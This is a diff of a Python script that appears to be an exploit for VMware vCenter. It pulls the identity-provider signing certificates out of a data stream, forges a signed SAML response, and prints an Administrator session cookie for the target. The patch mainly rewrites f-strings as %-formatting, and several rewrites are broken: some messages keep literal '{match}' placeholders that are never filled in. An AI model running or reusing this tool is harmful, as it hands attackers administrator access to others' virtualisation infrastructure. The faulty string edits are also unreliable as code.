@@ -122,7 +122,7 @@ def get_idp_cert(stream, verbose=False):
             size_hex = stream.read('bytes:1')
             size_hex = b'\x04' + size_hex
             size = int(size_hex.hex(), 16)
-            cert_bytes = stream.read(f'bytes:{size}')
+            cert_bytes = stream.read('bytes:%d'%size)
             if any(not_it in cert_bytes for not_it in not_it_list):
                 continue
 
@@ -133,7 +133,7 @@ def get_idp_cert(stream, verbose=False):
             print('[*] Successfully extracted the IdP certificate')        
             return key
     else:
-        print(f'[-] Failed to find the IdP certificate')
+        print('[-] Failed to find the IdP certificate')
         sys.exit()
 
 
@@ -155,32 +155,32 @@ def get_trusted_cert1(stream, verbose=False):
         for match in matches:
             stream.pos = match
             if verbose:
-                print(f'[!] Looking for cert 1 at position: {match}')
+                print('[!] Looking for cert 1 at position: {match}')
 
             cn_end = stream.readto('0x000013', bytealigned=True)
             cn_end_pos = stream.pos
             if verbose:
-                print(f'[!] CN end position: {cn_end_pos}')
+                print('[!] CN end position: {cn_end_pos}')
 
             stream.pos = match
             cn_len = int((cn_end_pos - match - 8) / 8)
-            cn = stream.read(f'bytes:{cn_len}').decode()
+            cn = stream.read('bytes:%d'%cn_len).decode()
             domain = get_domain_from_cn(cn)
             if domain:
-                print(f'[*] CN: {cn}')
-                print(f'[*] Domain: {domain}')
+                print('[*] CN: %s'%cn)
+                print('[*] Domain: %s'%domain)
             else:
-                print(f'[!] Failed parsing domain from CN')
+                print('[!] Failed parsing domain from CN')
                 sys.exit()
 
-            cn = stream.readto(f'0x0002', bytealigned=True)
+            cn = stream.readto('0x0002', bytealigned=True)
 
             # Get TrustedCertificate1 pem 1
             cert1_size_hex = stream.read('bytes:2')
             cert1_size = int(cert1_size_hex.hex(), 16)
-            cert1_bytes = stream.read(f'bytes:{cert1_size}')
+            cert1_bytes = stream.read('bytes:%d'%cert1_size)
             if verbose:
-                print(f'[!] Cert 1 size: {cert1_size}')
+                print('[!] Cert 1 size: %d'%cert1_size)
 
             if b'ssoserverSign' not in cert1_bytes:
                 if verbose:
@@ -194,7 +194,7 @@ def get_trusted_cert1(stream, verbose=False):
             print('[*] Successfully extracted trusted certificate 1')
             return cert1, domain
     else:
-        print(f'[-] Failed to find the trusted certificate 1 flags')
+        print('[-] Failed to find the trusted certificate 1 flags')
 
 
 def get_trusted_cert2(stream, verbose=False):
@@ -217,9 +217,9 @@ def get_trusted_cert2(stream, verbose=False):
         stream.pos = stream.pos - 40
         cert2_size_hex = stream.read('bytes:2')
         cert2_size = int(cert2_size_hex.hex(), 16)
-        cert2_bytes = stream.read(f'bytes:{cert2_size}')
+        cert2_bytes = stream.read('bytes:%d'%cert2_size)
         if verbose:
-            print(f'Cert 2 Size: {cert2_size}')
+            print('Cert 2 Size: %d'%cert2_size)
 
         cert2 = writepem(cert2_bytes, verbose)
         if not check_key_valid(cert2):
@@ -228,14 +228,14 @@ def get_trusted_cert2(stream, verbose=False):
         print('[*] Successfully extracted trusted certificate 2')
         return cert2
 
-    print(f'[-] Failed to find the trusted cert 2')
+    print('[-] Failed to find the trusted cert 2')
     sys.exit()
 
 def saml_request(vcenter):
     """Get SAML AuthnRequest from vCenter web UI"""
     try:
-        print(f'[*] Initiating SAML request with {vcenter}')
-        r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
+        print('[*] Initiating SAML request with'+ vcenter)
+        r = requests.get("https://%s/ui/login"%vcenter, allow_redirects=False, verify=False)
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
         o = urlparse(r.headers["location"])
@@ -244,7 +244,7 @@ def saml_request(vcenter):
         req = zlib.decompress(dec, -8)
         return etree.fromstring(req)
     except:
-        print(f'[-] Failed initiating SAML request with {vcenter}')
+        print('[-] Failed initiating SAML request with ' +vcenter)
         raise
 
 
@@ -290,7 +290,7 @@ def login(vcenter, saml_resp):
         print('[*] Attempting to log into vCenter with the signed SAML request')
         resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
         r = requests.post(
-            f"https://{vcenter}/ui/saml/websso/sso",
+            "https://%s/ui/saml/websso/sso"%vcenter,
             allow_redirects=False,
             verify=False,
             data={"SAMLResponse": base64.encodebytes(resp)},
@@ -298,8 +298,8 @@ def login(vcenter, saml_resp):
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
         cookie = r.headers["Set-Cookie"].split(";")[0]
-        print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
-        print(f'[+] Cookie: {cookie}')
+        print('[+] Successfuly obtained Administrator cookie for %s!'%vcenter)
+        print('[+] Cookie: ' +cookie)
     except:
         print('[-] Failed logging in with SAML request')
         raise
@@ -320,7 +320,7 @@ def get_hostname(vcenter):
         cert_bin = s.getpeercert(True)
         x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
         hostname = x509.get_subject().CN
-        print(f'[*] Found hostname {hostname} for {vcenter}')
+        print('[*] Found hostname %s for %s'%(hostname, vcenter))
         return hostname
     except:
         print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
